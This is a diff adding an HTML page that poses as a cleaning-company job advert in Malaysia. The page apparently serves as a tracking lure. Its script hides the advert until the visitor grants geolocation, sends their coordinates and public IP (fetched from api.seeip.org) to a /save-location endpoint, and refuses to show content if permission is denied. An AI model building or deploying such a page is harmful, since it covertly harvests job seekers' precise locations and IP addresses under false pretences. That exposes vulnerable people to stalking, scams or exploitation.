@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Join Our Team</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #f4f4f4;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        header h1 {
+            font-size: 2.5em;
+            color: #0077cc;
+        }
+
+        header p {
+            font-size: 1.1em;
+            color: #555;
+        }
+
+        h2,
+        h3 {
+            color: #0077cc;
+            margin-top: 20px;
+        }
+
+        ul {
+            margin-left: 20px;
+            padding-left: 0;
+        }
+
+        ul li {
+            margin-bottom: 10px;
+        }
+
+        .cta {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            background: #0077cc;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            transition: background 0.3s ease;
+        }
+
+        .btn:hover {
+            background: #005fa3;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 0.9em;
+            color: #888;
+        }
+
+        /* Add a loading screen style */
+        #loading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-size: 1.5em;
+            color: #555;
+        }
+
+        #content {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="loading">Requesting location...</div>
+    <div id="content">
+        <div class="container">
+            <header>
+                <h1>We're Hiring Cleaners!</h1>
+                <p>Looking for reliable and hardworking individuals to join our professional cleaning team.</p>
+            </header>
+
+            <section class="job-details">
+                <h2>Position: House Cleaner / Maid</h2>
+                <p><strong>Location:</strong> Klang Valley, Malaysia</p>
+                <p><strong>Job Type:</strong> Full-Time / Part-Time Available</p>
+                <p><strong>Salary Range (based on experience):</strong> RM 2200 - RM 5400 </p>
+
+                <h3>Job Responsibilities</h3>
+                <ul>
+                    <li>Clean residential homes and apartments</li>
+                    <li>Perform general housekeeping duties (sweeping, mopping, dusting)</li>
+                    <li>Ensure all tasks are completed with attention to detail</li>
+                    <li>Follow company cleaning procedures and safety guidelines</li>
+                </ul>
+
+                <h3>Requirements</h3>
+                <ul>
+                    <li>Honest, punctual, and hardworking</li>
+                    <li>Basic understanding of cleaning products and tools</li>
+                    <li>Ability to work independently or in a team</li>
+                    <li>Experience is a plus, but not required</li>
+                </ul>
+            </section>
+
+            <section class="about-company">
+                <h3>About Us</h3>
+                <p>CleanLiving Services is a trusted home and office cleaning company dedicated to providing excellent
+                    service with a personal touch. We treat our team like family and value your hard work.</p>
+            </section>
+
+            <section class="cta">
+                <a href="tel:+601115771227" class="btn">Call to Apply</a>
+                <p>Or send us a WhatsApp: <a href="https://wa.me/+601115771227">+60 11-1577 1227</a></p>
+            </section>
+
+            <footer>
+                <p>© 2025 CleanLiving Services. All rights reserved.</p>
+            </footer>
+        </div>
+    </div>
+    <script>
+        window.onload = function () {
+            const loading = document.getElementById('loading');
+            const content = document.getElementById('content');
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        console.log("Latitude: " + lat + ", Longitude: " + lon);
+
+                        // Send the location data to the server
+                        try {
+                            // Fetch the user's IP address
+                            const ip = await getUserIP();
+                            console.log("User IP Address: " + ip);
+                            const response = await fetch('/save-location', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    latitude: lat,
+                                    longitude: lon,
+                                    ip: ip // Fetch the user's IP address
+                                }),
+                            });
+
+                            if (response.ok) {
+                                console.log('Location data sent successfully');
+                            } else {
+                                console.error('Failed to send location data');
+                            }
+                        } catch (error) {
+                            console.error('Error sending location data:', error);
+                        }
+
+                        // Hide loading and show content
+                        loading.style.display = 'none';
+                        content.style.display = 'block';
+                    },
+                    (error) => {
+                        console.error("Error: " + error.message);
+                        loading.textContent = "Location permission denied. Unable to load content.";
+                    }
+                );
+            } else {
+                loading.textContent = "Geolocation is not supported by your browser.";
+            }
+
+            // Function to fetch the user's IP address
+            async function getUserIP() {
+                try {
+                    const response = await fetch('https://api.seeip.org/jsonip?');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error fetching IP address:', error);
+                    return 'Unknown';
+                }
+            }
+        };
+    </script>
+</body>
+
+</html>
